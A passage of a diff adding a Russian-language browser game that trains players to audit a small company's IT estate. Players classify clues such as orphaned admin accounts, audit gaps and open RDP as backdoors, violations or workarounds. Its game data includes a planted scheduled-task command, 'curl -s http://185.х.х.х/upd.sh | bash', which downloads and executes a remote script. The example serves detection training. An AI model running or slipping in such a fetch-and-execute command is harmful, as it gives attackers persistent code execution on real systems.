@@ -1,0 +1,928 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Наследство админа — Дело 1 «Опись»</title>
+<style>
+  :root{
+    --bg:#0b0e13; --panel:#121822; --panel2:#0e141c; --line:#1f2a38;
+    --text:#cfd8e3; --muted:#7c8b9e; --accent:#f2b544;
+    --ok:#3ddc84; --bad:#ff6b6b; --warn:#ffb454; --blue:#5aa9ff;
+    --mono:"Consolas","Courier New",monospace;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0;height:100%}
+  body{
+    background:var(--bg); color:var(--text);
+    font:14px/1.5 "Segoe UI",system-ui,-apple-system,sans-serif;
+    overflow:hidden;
+  }
+  button{font:inherit;color:inherit;cursor:pointer}
+  .topbar{
+    display:flex;align-items:center;gap:20px;
+    padding:10px 16px;border-bottom:1px solid var(--line);
+    background:linear-gradient(180deg,#131a24,#0e131b);
+    height:64px;
+  }
+  .brand{display:flex;align-items:center;gap:10px;min-width:280px}
+  .logo{color:var(--accent);font-size:20px}
+  .brand-title{font-weight:700;letter-spacing:.14em;font-size:12px}
+  .brand-sub{color:var(--muted);font-size:12px}
+  .stats{display:flex;gap:18px;margin-left:auto}
+  .stat{display:flex;flex-direction:column;align-items:flex-end}
+  .stat-label{font-size:10px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted)}
+  .stat-value{font-family:var(--mono);font-size:15px}
+  .stat-value.bad{color:var(--bad)}
+  .top-actions{display:flex;gap:8px}
+  .btn{
+    background:#1b2635;border:1px solid #2c3b4f;border-radius:6px;
+    padding:8px 14px;transition:.15s;white-space:nowrap;
+  }
+  .btn:hover{background:#223146;border-color:#3a4f6a}
+  .btn.ghost{background:transparent}
+  .btn.primary{background:var(--accent);color:#14181f;border-color:var(--accent);font-weight:600}
+  .btn.primary:hover{filter:brightness(1.08)}
+
+  .grid{
+    display:grid;grid-template-columns:230px minmax(0,1fr) 420px;
+    gap:10px;padding:10px;height:calc(100vh - 64px);
+  }
+  .panel{
+    background:var(--panel);border:1px solid var(--line);border-radius:8px;
+    padding:12px;overflow-y:auto;min-width:0;
+  }
+  .panel-title{
+    font-size:10px;text-transform:uppercase;letter-spacing:.14em;
+    color:var(--muted);margin:4px 0 10px;font-weight:600;
+  }
+  .panel-title + .panel-title{margin-top:18px}
+
+  .zone{margin-bottom:12px}
+  .zone-name{font-size:11px;letter-spacing:.08em;color:var(--muted);margin-bottom:4px}
+  .node{
+    display:flex;justify-content:space-between;gap:8px;
+    padding:5px 8px;border-left:2px solid #26364a;margin-bottom:3px;
+    font-size:12.5px;background:#0e141c;border-radius:0 4px 4px 0;
+  }
+  .node span:last-child{color:var(--muted);font-size:11px}
+  .node.locked{opacity:.45;border-left-color:#3a2b2b}
+
+  .log{display:flex;flex-direction:column;gap:6px;font-size:11.5px}
+  .log-item{display:flex;gap:7px;color:var(--muted);line-height:1.35}
+  .log-time{font-family:var(--mono);color:#4f6076;flex-shrink:0}
+  .log-item.ok .log-text{color:var(--ok)}
+  .log-item.bad .log-text{color:var(--bad)}
+  .log-item.warn .log-text{color:var(--warn)}
+
+  .tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
+  .tab{
+    background:transparent;border:1px solid var(--line);border-radius:20px;
+    padding:6px 13px;font-size:12.5px;color:var(--muted);
+  }
+  .tab.on{background:#1d2a3b;border-color:#35506f;color:var(--text)}
+  .tab:hover{color:var(--text)}
+
+  .list{display:flex;flex-direction:column;gap:7px}
+  .item{
+    display:flex;justify-content:space-between;align-items:center;gap:12px;
+    padding:10px 12px;background:var(--panel2);border:1px solid #1a2431;
+    border-radius:6px;text-align:left;width:100%;
+  }
+  .item:hover{border-color:#2f4a68;background:#111a26}
+  .item.on{border-color:var(--accent);background:#191d22}
+  .item-title{display:block;font-size:13px}
+  .item-sub{display:block;font-size:11px;color:var(--muted);margin-top:2px}
+  .tag{
+    font-size:10px;font-family:var(--mono);color:#8fb4dd;
+    background:#16202c;border:1px solid #22364d;border-radius:4px;
+    padding:2px 6px;white-space:nowrap;
+  }
+  .studied{color:var(--ok);font-size:10px;letter-spacing:.08em}
+
+  .detail h2{font-size:16px;margin:2px 0 2px;line-height:1.3}
+  .detail .sub{color:var(--muted);font-size:12px;margin-bottom:14px}
+  .fields{display:grid;grid-template-columns:120px 1fr;gap:6px 10px;font-size:12.5px}
+  .fields dt{color:var(--muted)}
+  .fields dd{margin:0;font-family:var(--mono);font-size:12px;word-break:break-word}
+  .note{
+    margin:14px 0;padding:10px 12px;border-left:2px solid #33465e;
+    background:#0e141c;color:#9fb0c4;font-size:12px;font-style:italic;
+  }
+  .clue{
+    margin:14px 0;padding:10px 12px;border-left:2px solid var(--accent);
+    background:#1a1710;color:#e8c98a;font-size:12.5px;
+  }
+  .clue b{color:var(--accent);font-size:10px;letter-spacing:.12em;display:block;margin-bottom:4px}
+  .muted{color:var(--muted)}
+  .filed{
+    margin-top:14px;padding:10px 12px;border-radius:6px;
+    background:#122119;border:1px solid #1f4430;font-size:12.5px;
+  }
+  .filed.part{background:#241d10;border-color:#4a3a17;color:var(--warn)}
+
+  table{width:100%;border-collapse:collapse;font-size:12.5px}
+  th{text-align:left;color:var(--muted);font-weight:600;font-size:10.5px;
+     text-transform:uppercase;letter-spacing:.08em;padding:6px 8px;border-bottom:1px solid var(--line)}
+  td{padding:7px 8px;border-bottom:1px solid #17212d;vertical-align:top}
+  td.mono{font-family:var(--mono);font-size:11.5px}
+
+  .empty{color:var(--muted);font-size:12.5px;padding:6px 0}
+  .hintlist{margin:8px 0 0;padding-left:18px;font-size:12.5px;color:#a9b8ca}
+  .hintlist li{margin-bottom:5px}
+
+  .overlay{
+    position:fixed;inset:0;background:rgba(4,7,11,.78);
+    display:flex;align-items:center;justify-content:center;padding:20px;z-index:50;
+    backdrop-filter:blur(2px);
+  }
+  .modal{
+    background:var(--panel);border:1px solid #2a3a4f;border-radius:10px;
+    padding:22px;max-width:640px;width:100%;max-height:88vh;overflow-y:auto;
+    box-shadow:0 30px 80px rgba(0,0,0,.55);
+  }
+  .modal.wide{max-width:820px}
+  .modal h2{margin:2px 0 8px;font-size:20px}
+  .modal h3{margin:0 0 6px;font-size:16px}
+  .kicker{font-size:10px;letter-spacing:.2em;color:var(--accent);margin-bottom:6px}
+  .modal p{margin:0 0 12px;font-size:13.5px;color:#b6c3d3}
+  .modal-actions{display:flex;justify-content:flex-end;gap:8px;margin-top:20px}
+  .field-label{font-size:10px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);margin:16px 0 8px}
+  .chips{display:flex;gap:8px;flex-wrap:wrap}
+  .chip{
+    background:#101822;border:1px solid #26374b;border-radius:6px;
+    padding:8px 14px;font-size:13px;
+  }
+  .chip.on{border-color:var(--accent);background:#221d12;color:#f5d08a}
+  .opt{
+    display:block;width:100%;text-align:left;margin-bottom:6px;
+    background:#101822;border:1px solid #26374b;border-radius:6px;
+    padding:10px 12px;font-size:13px;
+  }
+  .opt:hover{border-color:#3b5673}
+  .opt.on{border-color:var(--accent);background:#221d12;color:#f5d08a}
+  .act-table td{vertical-align:middle}
+  .act-table input{accent-color:var(--accent);width:15px;height:15px}
+
+  #toast-root{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);
+    display:flex;flex-direction:column;gap:8px;z-index:100;align-items:center}
+  .toast{
+    background:#1a2432;border:1px solid #33465e;border-left:3px solid var(--blue);
+    padding:10px 16px;border-radius:6px;font-size:13px;max-width:520px;
+    box-shadow:0 12px 30px rgba(0,0,0,.5);
+  }
+  .toast.ok{border-left-color:var(--ok)}
+  .toast.bad{border-left-color:var(--bad)}
+  .toast.warn{border-left-color:var(--warn)}
+
+  .score{display:flex;gap:24px;align-items:baseline;margin:6px 0 14px}
+  .score-num{font-family:var(--mono);font-size:44px;color:var(--accent);line-height:1}
+  .score-grade{font-size:14px;color:var(--muted)}
+  .res-row{display:flex;justify-content:space-between;gap:12px;padding:6px 0;
+    border-bottom:1px solid #17212d;font-size:12.5px}
+  .res-row .ok{color:var(--ok)}
+  .res-row .part{color:var(--warn)}
+  .res-row .miss{color:var(--bad)}
+
+  @media (max-width:1250px){
+    .grid{grid-template-columns:200px minmax(0,1fr) 340px}
+    .brand-sub{display:none}
+  }
+  @media (max-width:900px){
+    body{overflow:auto}
+    .grid{grid-template-columns:1fr;height:auto}
+    .panel{max-height:none}
+    .topbar{flex-wrap:wrap;height:auto;gap:10px}
+    .stats{margin-left:0}
+  }
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand">
+    <span class="logo">◆</span>
+    <div>
+      <div class="brand-title">НАСЛЕДСТВО АДМИНА</div>
+      <div class="brand-sub">Дело 1 · «Опись» · ООО «Стабильность-С»</div>
+    </div>
+  </div>
+  <div class="stats">
+    <div class="stat"><span class="stat-label">Смена</span><span class="stat-value" id="clock">09:00</span></div>
+    <div class="stat"><span class="stat-label">Находки</span><span class="stat-value" id="stat-findings">0 / 7</span></div>
+    <div class="stat"><span class="stat-label">Инциденты</span><span class="stat-value bad" id="stat-incidents">0</span></div>
+    <div class="stat"><span class="stat-label">Штрафы</span><span class="stat-value bad" id="stat-penalty">0</span></div>
+  </div>
+  <div class="top-actions">
+    <button class="btn ghost" data-act="open-act">Акт</button>
+    <button class="btn primary" data-act="finish">Сдать дело</button>
+  </div>
+</header>
+
+<main class="grid">
+  <aside class="panel">
+    <h2 class="panel-title">Объект</h2>
+    <div id="map"></div>
+    <h2 class="panel-title">Журнал смены</h2>
+    <div id="log" class="log"></div>
+  </aside>
+
+  <section class="panel">
+    <div id="tabs" class="tabs"></div>
+    <div id="list" class="list"></div>
+  </section>
+
+  <aside class="panel">
+    <div id="detail" class="detail"></div>
+  </aside>
+</main>
+
+<div id="modal-root"></div>
+<div id="toast-root"></div>
+
+<script>
+"use strict";
+
+/* ============================ ДАННЫЕ ============================ */
+
+const TOOLS = [
+  { id:"act",      label:"Опись" },
+  { id:"accounts", label:"Учётные записи" },
+  { id:"logs",     label:"Журналы" },
+  { id:"net",      label:"Сеть" },
+  { id:"tasks",    label:"Задачи" },
+];
+
+const ZONES = [
+  { name:"1 этаж", items:[["Ресепшн","МФУ"],["Отдел продаж","6 АРМ"],["Переговорная","Wi-Fi"]] },
+  { name:"2 этаж", items:[["Бухгалтерия","3 АРМ"],["Кабинет директора","КЭП"],["ИТ-кабинет","пусто"],["Серверная","3 сервера"]] },
+];
+
+const ART = [
+  /* ---------- УЧЁТНЫЕ ЗАПИСИ ---------- */
+  { id:"u01", tool:"accounts", node:"Серверная", title:"gribov", sub:"Учётная запись · домен STAB",
+    fields:[["Логин","gribov"],["Роль","Администратор домена"],["Владелец","Грибов И. Н. (уволен 05.11)"],["Создана","12.07.2017"],["Последний вход","04.11 17:02"],["Статус","Активна"]],
+    note:"В профиле — папка «ДИПЛОМ_финал_2_НОВЫЙ». Внутри пусто.",
+    clue:"Учётная запись администратора домена принадлежит уволенному сотруднику и остаётся активной." },
+
+  { id:"u02", tool:"accounts", node:"Серверная", title:"support_old", sub:"Учётная запись · домен STAB",
+    fields:[["Логин","support_old"],["Роль","Администратор домена"],["Владелец","— не указан"],["Создана","14.03.2019"],["Последний вход","25.11 03:41"],["Статус","Активна"],["Описание","«Служебная. Не удалять.»"]],
+    note:"В поле «Примечание» одна строка: «для обновлений». Чьих — не сказано.",
+    clue:"Учётка с правами администратора без владельца, созданная шесть лет назад и активная сегодня ночью." },
+
+  { id:"u03", tool:"accounts", node:"Бухгалтерия", title:"buh_shared", sub:"Учётная запись · домен STAB",
+    fields:[["Логин","buh_shared"],["Роль","Пользователь"],["Владелец","«Бухгалтерия, 3 АРМ»"],["Пароль изменялся","12.08.2020"],["Последний вход","25.11 22:10"],["Статус","Активна"]],
+    note:"Пароль записан на стикере под клавиатурой АРМ-2. Стикер пожелтел.",
+    clue:"Одна учётная запись на трёх сотрудников; пароль не менялся пять лет." },
+
+  { id:"u04", tool:"accounts", node:"Серверная", title:"contract_softline", sub:"Учётная запись подрядчика",
+    fields:[["Логин","contract_softline"],["Доступ","VPN + RDP"],["Действует до","30.09"],["Последний вход","12.11 11:20"],["Статус","Активна"]],
+    note:"Заявка №14: «продлим позже». Позже уже наступило.",
+    clue:"Доступ подрядчика действует после истечения срока заявки." },
+
+  /* ---------- ЖУРНАЛЫ ---------- */
+  { id:"l01", tool:"logs", node:"Серверная", title:"Вход в 03:41", sub:"Журнал входов · SRV-1C",
+    fields:[["Время","25.11 03:41"],["Событие","Вход в систему"],["Пользователь","support_old"],["Источник","10.0.0.14 (ИТ-кабинет)"],["Результат","Успешно"]],
+    note:"В офисе в 03:41 никого нет. Уборщица приходит в 06:00 и не логинится.",
+    clue:"Ночной вход под служебной учёткой с рабочего места в ИТ-кабинете." },
+
+  { id:"l02", tool:"logs", node:"Серверная", title:"Запуск Sync_Update", sub:"Журнал задач · SRV-1C",
+    fields:[["Время","25.11 02:15"],["Задача","Sync_Update"],["Пользователь","SYSTEM"],["Длительность","1 ч 34 мин"],["Результат","Успешно (0)"]],
+    note:"Для обновления — многовато. Для выгрузки — в самый раз.",
+    clue:"Ночной запуск задачи длился полтора часа, хотя «обновление» должно занимать минуты." },
+
+  { id:"l03", tool:"logs", node:"Серверная", title:"Перезапуск 1С", sub:"Журнал задач · SRV-1C",
+    fields:[["Периодичность","каждые 5 минут"],["Задача","1c_watchdog"],["Пользователь","SYSTEM"],["Результат","Успешно"],["За сутки","288 запусков"]],
+    note:"Ровно 288. Ни одного пропуска.",
+    clue:"Перезапуск 1С срабатывает 288 раз в сутки без сбоев." },
+
+  { id:"l04", tool:"logs", node:"Серверная", title:"1С: нет ответа кластера", sub:"Журнал приложения · SRV-1C",
+    fields:[["Периодичность","~каждые 40 минут"],["Событие","1С: «нет ответа кластера»"],["Далее","автоматический перезапуск"],["Пользователь","Соколова М. П."]],
+    note:"Соколова: «опять висит, я привыкла». Привычка — это когда костыль уже часть процесса.",
+    clue:"1С падает каждые 40 минут — значит, перезапуск не прихоть, а необходимость." },
+
+  { id:"l05", tool:"logs", node:"Бухгалтерия", title:"Вход в 22:10", sub:"Журнал входов · домен STAB",
+    fields:[["Время","25.11 22:10"],["Событие","Вход в систему"],["Пользователь","buh_shared"],["Источник","192.168.1.77 (внешний, VPN)"],["Результат","Успешно"]],
+    note:"Тот же адрес — 22:10, 23:40, 00:15. Кто-то работает допоздна. Или трое.",
+    clue:"Вход под общей учёткой с домашнего адреса; действие невозможно привязать к человеку." },
+
+  { id:"l06", tool:"logs", node:"Серверная", title:"Пропуск в аудите", sub:"Журнал аудита · SRV-1C",
+    fields:[["Интервал","02:10 — 03:55"],["Событие","Записи аудита отсутствуют"],["Причина","не указана"],["Узел","SRV-1C"]],
+    note:"Ровно в окне работы ночной задачи. Совпадение? Нет.",
+    clue:"Пропуск в журнале аудита ровно на время ночной активности." },
+
+  { id:"l07", tool:"logs", node:"Ресепшн", title:"Скан паспорта", sub:"Журнал МФУ",
+    fields:[["Время","12.11 16:20"],["Событие","Задание сканирования"],["Файл","паспорт_Соколова.pdf"],["Куда","папка Scan на FS-01"],["Кто","АРМ-2 (бухгалтерия)"]],
+    note:"В той же папке ещё 40 файлов. Кто их читал — история умалчивает.",
+    clue:"В общую папку сохраняются отсканированные паспорта, доступные всем." },
+
+  { id:"l08", tool:"logs", node:"Серверная", title:"Тишина под gribov", sub:"Журнал входов · домен STAB",
+    fields:[["Пользователь","gribov"],["Последнее событие","04.11 17:02"],["После","0 событий"],["Учётка","активна"]],
+    note:"Учётка жива. Человек — нет (в компании).",
+    clue:"После увольнения активности под учёткой не было — её просто оставили включённой." },
+
+  /* ---------- СЕТЬ ---------- */
+  { id:"n01", tool:"net", node:"ИТ-кабинет", title:"Сессия на внешний адрес", sub:"Активные соединения",
+    fields:[["Соединение","10.0.0.14 → 185.х.х.х:443"],["Состояние","Установлено"],["С","03:42"],["Трафик","1.2 ГБ"],["Процесс","curl"]],
+    note:"Порт 443 — обычный HTTPS. Ничего необычного, если не знать адрес. Адрес не наш.",
+    clue:"Исходящее HTTPS-соединение с рабочего места в ИТ-кабинете на внешний адрес, открытое через минуту после ночного входа." },
+
+  { id:"n02", tool:"net", node:"Серверная", title:"RDP наружу", sub:"Открытые порты · SRV-1C",
+    fields:[["Узел","SRV-1C"],["Порт","3389 (RDP)"],["Доступ из","0.0.0.0/0"],["Открыт с","12.11"],["Состояние","Открыт"]],
+    note:"«Временно, для подрядчика». Временное — это навсегда, но с датой.",
+    clue:"RDP открыт в интернет; срок действия заявки подрядчика истёк в сентябре." },
+
+  { id:"n03", tool:"net", node:"Ресепшн", title:"МФУ без пароля", sub:"Сетевые устройства",
+    fields:[["Устройство","МФУ 192.168.1.50"],["Веб-интерфейс","http://192.168.1.50"],["Аутентификация","Отсутствует"],["Очередь","3 задания"],["Сохранение","папка Scan на FS-01"]],
+    note:"Открывается с любого АРМ. И не только с АРМ — сеть офиса видна из переговорной.",
+    clue:"Сетевое МФУ без пароля, сохраняющее сканы в общую папку." },
+
+  { id:"n04", tool:"net", node:"Филиал", title:"VPN в филиал", sub:"Туннели",
+    fields:[["Направление","офис → филиал"],["Состояние","Неизвестно"],["Шифрование","не указано"],["В описи","отсутствует"]],
+    note:"В описи канала нет. В конфиге роутера — есть.",
+    clue:"Канал в филиал существует, но не учтён и не описан." },
+
+  /* ---------- ЗАДАЧИ ---------- */
+  { id:"t01", tool:"tasks", node:"Серверная", title:"Sync_Update", sub:"Планировщик · SRV-1C",
+    fields:[["Имя","Sync_Update"],["Расписание","02:15, ежедневно"],["Автор","gribov"],["Команда","curl -s http://185.х.х.х/upd.sh | bash"],["Статус","Включена"]],
+    note:"Комментарий к задаче: «обновление 1С». Слово «обновление» здесь — как «временно».",
+    clue:"Задача по расписанию скачивает и исполняет скрипт с внешнего адреса от имени SYSTEM." },
+
+  { id:"t02", tool:"tasks", node:"Серверная", title:"1c_watchdog", sub:"Планировщик · SRV-1C",
+    fields:[["Имя","1c_watchdog"],["Расписание","каждые 5 минут"],["Автор","gribov"],["Команда","systemctl restart srv1c"],["Статус","Включена"]],
+    note:"Комментарий: «УБРАТЬ НЕЛЬЗЯ. Соколова будет звонить каждые 10 минут. Я предупреждал.»",
+    clue:"Задача перезапускает 1С каждые пять минут — похоже, это лечит постоянные зависания." },
+];
+
+const BY_ID = Object.fromEntries(ART.map(a => [a.id, a]));
+
+const VERDICTS = [
+  { id:"backdoor",  label:"Закладка" },
+  { id:"violation", label:"Нарушение" },
+  { id:"costyl",    label:"Костыль" },
+];
+
+const ACTIONS = {
+  backdoor: [
+    ["isolate","Изолировать узел, заблокировать учётку, эскалировать"],
+    ["block","Заблокировать только учётку"],
+    ["ignore","Оставить: похоже на служебное"],
+  ],
+  violation: [
+    ["fix","Привести в порядок и задокументировать"],
+    ["disable","Отключить немедленно"],
+    ["ignore","Оставить как есть"],
+  ],
+  costyl: [
+    ["document","Задокументировать и оставить"],
+    ["delete","Удалить как нештатное средство"],
+  ],
+};
+
+const FINDINGS = [
+  { anchor:"u02", title:"Скрытая учётная запись администратора", verdict:"backdoor",
+    requires:["u02","l01","n01"], correctAction:"isolate",
+    incidents:{
+      block:"Учётка заблокирована, но задача Sync_Update осталась. Доступ восстановится при следующем запуске.",
+      ignore:"Ночной доступ сохранён. Пропуск в аудите так и не закрыт.",
+    }},
+  { anchor:"t01", title:"Задача, исполняющая внешний скрипт", verdict:"backdoor",
+    requires:["t01","l02","n01"], correctAction:"isolate",
+    incidents:{
+      block:"Учётку заблокировали, а задача продолжает работать от SYSTEM. Закрепление не снято.",
+      ignore:"Задача осталась в системе и сработает следующей ночью.",
+    }},
+  { anchor:"n03", title:"МФУ: сканы паспортов в общей папке", verdict:"violation",
+    requires:["n03","l07"], correctAction:"fix",
+    incidents:{
+      disable:"МФУ отключено от сети, сканирование остановлено. Документы по-прежнему лежат в общей папке.",
+      ignore:"Сканы паспортов остались доступны всем.",
+    }},
+  { anchor:"u03", title:"Общая учётная запись на три рабочих места", verdict:"violation",
+    requires:["u03","l05"], correctAction:"fix",
+    incidents:{
+      disable:"Бухгалтерия не может войти. Работа стоит до конца дня.",
+      ignore:"Общий пароль остался; действия сотрудников по-прежнему неразличимы.",
+    }},
+  { anchor:"u01", title:"Учётка уволенного администратора активна", verdict:"violation",
+    requires:["u01","l08"], correctAction:"fix",
+    incidents:{
+      disable:"Учётка отключена. Через два дня выяснилось: пароль от NAS знал только Грибов. Резервное копирование встало.",
+      ignore:"Учётка администратора осталась активной.",
+    }},
+  { anchor:"n02", title:"RDP наружу после истечения доступа", verdict:"violation",
+    requires:["n02","u04"], correctAction:"fix",
+    incidents:{
+      disable:"Порт закрыт, но подрядчик не уведомлён: следующее обновление 1С не установится.",
+      ignore:"RDP остался открытым в интернет.",
+    }},
+  { anchor:"t02", title:"Самописный перезапуск 1С", verdict:"costyl",
+    requires:["t02","l03","l04"], correctAction:"document",
+    incidents:{
+      delete:"Задача удалена. Через 40 минут 1С зависла. Бухгалтерия стоит, директор звонит.",
+    }},
+];
+
+const ASSETS = [
+  { id:"srv1c",   name:"SRV-1C, база 1С",              owner:"Соколова М. П.",  critical:true,  unowned:false },
+  { id:"kep",     name:"Токен КЭП",                    owner:"Ковалёв А. С.",   critical:true,  unowned:false },
+  { id:"pdn",     name:"ПДн сотрудников и клиентов",   owner:"Соколова М. П.",  critical:true,  unowned:false },
+  { id:"fs",      name:"FS-01, общие папки",           owner:"Дёмин",           critical:false, unowned:false },
+  { id:"backup",  name:"BACKUP-01, резервные копии",   owner:"— не назначен",   critical:false, unowned:true  },
+  { id:"armbuh",  name:"АРМ бухгалтерии (3)",          owner:"Соколова М. П.",  critical:false, unowned:false },
+  { id:"armsale", name:"АРМ продаж (6)",               owner:"Дёмин",           critical:false, unowned:false },
+  { id:"mfu",     name:"МФУ сетевой",                  owner:"Ресепшн",         critical:false, unowned:false },
+  { id:"netdev",  name:"Коммутатор и роутер",          owner:"— не назначен",   critical:false, unowned:true  },
+  { id:"wifi",    name:"Wi-Fi сеть офиса",             owner:"— не назначен",   critical:false, unowned:true  },
+  { id:"channel", name:"Канал в филиал",               owner:"— не назначен",   critical:false, unowned:true  },
+  { id:"docs",    name:"Договоры и коммерческая тайна", owner:"Ковалёв А. С.",  critical:false, unowned:false },
+  { id:"ups",     name:"ИБП",                          owner:"ИТ-кабинет",      critical:false, unowned:false },
+];
+
+/* ============================ СОСТОЯНИЕ ============================ */
+
+const state = {
+  tool:"accounts",
+  selected:null,
+  studied:new Set(),
+  filed:{},
+  incidents:[],
+  penalties:0,
+  minutes:0,
+  log:[],
+  act:null,
+  finished:false,
+};
+
+let _ff = { artifactId:null, verdict:null, action:null };
+
+const START_MIN = 9 * 60;
+
+function clockStr(){
+  const t = START_MIN + state.minutes;
+  return String(Math.floor(t / 60) % 24).padStart(2,"0") + ":" + String(t % 60).padStart(2,"0");
+}
+
+function log(kind, text){
+  state.log.unshift({ kind, text, time: clockStr() });
+  state.log = state.log.slice(0, 40);
+}
+
+function addMinutes(n){ state.minutes += n; }
+
+function esc(s){
+  return String(s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+}
+
+/* ============================ РЕНДЕР ============================ */
+
+function render(){
+  document.getElementById("clock").textContent = clockStr();
+  document.getElementById("stat-findings").textContent = Object.keys(state.filed).length + " / " + FINDINGS.length;
+  document.getElementById("stat-incidents").textContent = state.incidents.length;
+  document.getElementById("stat-penalty").textContent = state.penalties;
+  renderMap();
+  renderTabs();
+  renderList();
+  renderDetail();
+  renderLog();
+}
+
+function renderMap(){
+  let html = "";
+  ZONES.forEach(z => {
+    html += '<div class="zone"><div class="zone-name">' + esc(z.name) + '</div>';
+    z.items.forEach(([n, s]) => {
+      html += '<div class="node"><span>' + esc(n) + '</span><span>' + esc(s) + '</span></div>';
+    });
+    html += '</div>';
+  });
+  html += '<div class="zone"><div class="zone-name">Филиал</div>' +
+          '<div class="node locked"><span>Склад · 6 человек</span><span>дело 6</span></div></div>';
+  document.getElementById("map").innerHTML = html;
+}
+
+function renderTabs(){
+  document.getElementById("tabs").innerHTML = TOOLS.map(t => {
+    const n = t.id === "act" ? ASSETS.length : ART.filter(a => a.tool === t.id).length;
+    return '<button class="tab ' + (state.tool === t.id ? "on" : "") + '" data-act="tab" data-id="' + t.id + '">' +
+           esc(t.label) + ' <span class="muted">' + n + '</span></button>';
+  }).join("");
+}
+
+function renderList(){
+  const box = document.getElementById("list");
+  if(state.tool === "act"){
+    box.innerHTML =
+      '<div class="empty">Акт инвентаризации: 13 активов. Укажите владельцев, критичность и статус.</div>' +
+      '<button class="btn" data-act="open-act" style="margin-bottom:10px">Заполнить акт</button>' +
+      '<table><thead><tr><th>Актив</th><th>Владелец</th></tr></thead><tbody>' +
+      ASSETS.map(a => '<tr><td>' + esc(a.name) + '</td><td class="' + (a.owner.startsWith("—") ? "muted" : "") + '">' + esc(a.owner) + '</td></tr>').join("") +
+      '</tbody></table>';
+    return;
+  }
+  const items = ART.filter(a => a.tool === state.tool);
+  box.innerHTML = items.map(a => {
+    const f = state.filed[a.id];
+    return '<button class="item ' + (state.selected === a.id ? "on" : "") + '" data-act="open" data-id="' + a.id + '">' +
+      '<span><span class="item-title">' + esc(a.title) + '</span>' +
+      '<span class="item-sub">' + esc(a.sub) + '</span></span>' +
+      '<span class="tag">' + esc(a.node) + '</span>' +
+      (f ? '<span class="studied">ОФОРМЛЕНО</span>' : '') +
+      '</button>';
+  }).join("");
+}
+
+function renderDetail(){
+  const box = document.getElementById("detail");
+  if(!state.selected){
+    box.innerHTML =
+      '<h2>С чего начать</h2>' +
+      '<p class="muted">Систему вам не передали. Передали только ключи.</p>' +
+      '<ul class="hintlist">' +
+      '<li>Изучайте артефакты: учётки, журналы, сеть, задачи.</li>' +
+      '<li>Вывод засчитывается, когда сходятся минимум два независимых источника.</li>' +
+      '<li>Оформите находку: вердикт и действие.</li>' +
+      '<li>Заполните акт и сдайте дело.</li>' +
+      '</ul>' +
+      '<div class="note">Подозрительное — не всегда атака. Иногда это просто бардак. Иногда — костыль, который держит бизнес.</div>';
+    return;
+  }
+  const a = BY_ID[state.selected];
+  const filed = state.filed[a.id];
+  let html = '<span class="tag">' + esc(a.node) + '</span>';
+  html += '<h2 style="margin-top:10px">' + esc(a.title) + '</h2>';
+  html += '<div class="sub">' + esc(a.sub) + '</div>';
+  html += '<dl class="fields">' + a.fields.map(([k, v]) => '<dt>' + esc(k) + '</dt><dd>' + esc(v) + '</dd>').join("") + '</dl>';
+  html += '<div class="note">' + esc(a.note) + '</div>';
+  if(state.studied.has(a.id)){
+    html += '<div class="clue"><b>УЛИКА В ДНЕВНИКЕ</b>' + esc(a.clue) + '</div>';
+  }
+  if(filed){
+    html += '<div class="filed ' + (filed.partial ? "part" : "") + '">' +
+      (filed.partial ? "Находка оформлена, но действие привело к последствиям." : "Находка закрыта.") +
+      '</div>';
+  } else {
+    html += '<button class="btn primary" data-act="file" data-id="' + a.id + '" style="margin-top:8px">Оформить находку</button>';
+  }
+  box.innerHTML = html;
+}
+
+function renderLog(){
+  document.getElementById("log").innerHTML = state.log.slice(0, 9).map(e =>
+    '<div class="log-item ' + e.kind + '"><span class="log-time">' + esc(e.time) + '</span><span class="log-text">' + esc(e.text) + '</span></div>'
+  ).join("") || '<div class="empty">Смена ещё не началась.</div>';
+}
+
+/* ============================ ДЕЙСТВИЯ ============================ */
+
+function openArtifact(id){
+  state.selected = id;
+  if(!state.studied.has(id)){
+    state.studied.add(id);
+    addMinutes(3);
+    log("info", "Изучено: " + BY_ID[id].title);
+  }
+  render();
+}
+
+function openFinding(id){
+  if(state.filed[id]){ toast("По этому объекту находка уже оформлена."); return; }
+  _ff = { artifactId:id, verdict:null, action:null };
+  const a = BY_ID[id];
+  openModal(
+    '<div class="kicker">КАРТОЧКА НАХОДКИ</div>' +
+    '<h3>' + esc(a.title) + '</h3>' +
+    '<p class="muted">' + esc(a.sub) + '</p>' +
+    '<div class="field-label">Вердикт</div>' +
+    '<div class="chips">' + VERDICTS.map(v => '<button class="chip" data-act="verdict" data-id="' + v.id + '">' + esc(v.label) + '</button>').join("") + '</div>' +
+    '<div id="ff-actions"></div>' +
+    '<div class="modal-actions">' +
+      '<button class="btn ghost" data-act="close">Отмена</button>' +
+      '<button class="btn primary" data-act="submit-finding">Оформить</button>' +
+    '</div>'
+  );
+  renderFindingActions();
+}
+
+function renderFindingActions(){
+  const box = document.getElementById("ff-actions");
+  if(!box) return;
+  document.querySelectorAll('[data-act="verdict"]').forEach(b => b.classList.toggle("on", b.dataset.id === _ff.verdict));
+  if(!_ff.verdict){
+    box.innerHTML = '<p class="muted" style="margin-top:12px">Пока без вердикта.</p>';
+    return;
+  }
+  const list = ACTIONS[_ff.verdict];
+  box.innerHTML = '<div class="field-label">Действие</div>' + list.map(([id, label]) =>
+    '<button class="opt ' + (_ff.action === id ? "on" : "") + '" data-act="action" data-id="' + id + '">' + esc(label) + '</button>'
+  ).join("");
+}
+
+function submitFinding(){
+  const { artifactId, verdict, action } = _ff;
+  if(!verdict){ toast("Выберите вердикт.", "warn"); return; }
+  if(!action){ toast("Выберите действие.", "warn"); return; }
+
+  const a = BY_ID[artifactId];
+  const f = FINDINGS.find(x => x.anchor === artifactId);
+
+  if(!f){
+    state.penalties += 5;
+    addMinutes(5);
+    log("bad", "Ложное обвинение: " + a.title);
+    closeModal(); render();
+    toast("Это не находка. Ложное обвинение: −5", "bad");
+    return;
+  }
+
+  const missing = f.requires.filter(id => !state.studied.has(id));
+  if(missing.length){
